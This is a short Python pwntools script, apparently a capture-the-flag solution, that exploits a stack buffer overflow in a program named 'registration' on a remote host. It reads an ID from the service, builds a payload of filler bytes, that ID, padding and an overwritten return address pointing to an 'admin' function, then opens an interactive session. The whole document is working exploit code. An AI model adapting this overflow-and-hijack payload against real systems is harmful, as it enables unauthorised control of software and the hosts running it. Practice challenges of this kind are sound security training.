from pwn import *
#r = process("./registration")
r = remote("120.114.62.211",6128)

r.recvuntil(b":")

iid = r.recvline()[:-1]

iid = int(iid.decode("ascii"))


admin = 0x00000000004007d6
payload = b"A"*60 + p64(iid)+b"b"*4+p64(admin)
print(payload)
r.recvuntil(b":")
r.sendline(b"123")
r.recvuntil(b":")

r.sendline(payload)
r.interactive()

